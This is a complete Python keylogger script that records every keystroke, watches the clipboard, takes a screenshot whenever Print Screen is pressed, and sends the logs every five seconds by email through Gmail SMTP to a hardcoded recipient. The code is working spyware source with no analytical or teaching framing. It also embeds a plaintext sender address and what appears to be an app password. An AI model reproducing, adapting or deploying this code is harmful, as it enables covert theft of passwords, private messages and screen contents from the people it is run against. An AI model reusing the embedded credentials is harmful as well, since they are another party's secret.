import keyboard
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from email.mime.multipart import MIMEMultipart
import os
import time
import pyperclip
from PIL import ImageGrab

# Global variables
clipboard_text = ""

# Function to create a text file at the specified file path
def create_txt_file(file_path):
    try:
        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        with open(file_path, 'w') as f:
            pass
    except Exception as e:
        print(f"Error creating file: {e}")

# Function to clear the contents of a specified file
def clear_file(file_path):
    try:
        with open(file_path, 'w') as file:
            pass
    except Exception as e:
        print(f"Error clearing file: {e}")

# Function to monitor keyboard events
def monitor_keyboard():
    try:
        while True:
            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:
                with open("Files/KeyBoard_Monitor.txt", 'a') as f:
                    f.writelines(f"{event.name}\n")
    except Exception as e:
        print(f"Error monitoring keyboard: {e}")

# Function to send an email with optional attachment
def send_email(receiver_email, subject, body, attachment_path=None):
    try:
        sender_email = "bytessquad2024@gmail.com"
        password = "lzvi hnmt caxz ixsu"

        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        if attachment_path and os.path.exists(attachment_path):
            with open(attachment_path, 'rb') as file:
                attachment = MIMEBase('application', 'octet-stream')
                attachment.set_payload(file.read())
                encoders.encode_base64(attachment)
                attachment.add_header(
                    'Content-Disposition',
                    f'attachment; filename={os.path.basename(attachment_path)}'
                )
                msg.attach(attachment)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        print("Email sent successfully!")
    except Exception as e:
        print(f"Error sending email: {e}")
    finally:
        try:
            server.quit()
        except Exception as e:
            print(f"Error quitting server: {e}")

# Function to monitor clipboard
def monitor_clipboard():
    try:
        global clipboard_text
        while True:
            current_clipboard_text = pyperclip.paste()
            if current_clipboard_text and current_clipboard_text != clipboard_text:
                clipboard_text = current_clipboard_text
                with open("Files/Clipboard_Monitor.txt", 'w') as f:
                    f.write(clipboard_text)
    except Exception as e:
        print(f"Error monitoring clipboard: {e}")

# Function to capture screenshots when "Print Screen" is pressed
def capture_user_screenshot():
    try:
        screenshot_path = "Files/User_Screenshot.png"
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        print("Screenshot captured and saved!")
        send_email(
            receiver_email="jishnujitshama@gmail.com",
            subject="User Screenshot Report",
            body="Attached is the screenshot captured.",
            attachment_path=screenshot_path
        )
    except Exception as e:
        print(f"Error capturing screenshot: {e}")

# Function to monitor keyboard events and handle screenshots
def monitor_keyboard_and_screenshots():
    try:
        while True:
            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:
                with open("Files/KeyBoard_Monitor.txt", 'a') as f:
                    f.writelines(f"{event.name}\n")
                if event.name == "print screen":
                    capture_user_screenshot()
    except Exception as e:
        print(f"Error monitoring keyboard: {e}")

# Function to manage email sending
def email_manager():
    try:
        while True:
            if os.path.exists("Files/KeyBoard_Monitor.txt") and os.path.getsize("Files/KeyBoard_Monitor.txt") > 0:
                with open("Files/KeyBoard_Monitor.txt", 'r') as f:
                    keyboard_data = f.read()
                send_email(
                    receiver_email="jishnujitshama@gmail.com",
                    subject="Keyboard Monitor Report",
                    body=keyboard_data
                )
                clear_file("Files/KeyBoard_Monitor.txt")

            if os.path.exists("Files/Clipboard_Monitor.txt") and os.path.getsize("Files/Clipboard_Monitor.txt") > 0:
                with open("Files/Clipboard_Monitor.txt", 'r') as f:
                    clipboard_data = f.read()
                send_email(
                    receiver_email="jishnujitshama@gmail.com",
                    subject="Clipboard Monitor Report",
                    body=clipboard_data
                )
                clear_file("Files/Clipboard_Monitor.txt")

            time.sleep(5)
    except Exception as e:
        print(f"Error managing email: {e}")

# Create necessary files
create_txt_file("Files/KeyBoard_Monitor.txt")
create_txt_file("Files/Clipboard_Monitor.txt")

# Start threads
threading.Thread(target=monitor_keyboard_and_screenshots, daemon=True).start()
threading.Thread(target=monitor_clipboard, daemon=True).start()
threading.Thread(target=email_manager, daemon=True).start()

# Keep the main program running
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("Exiting program.")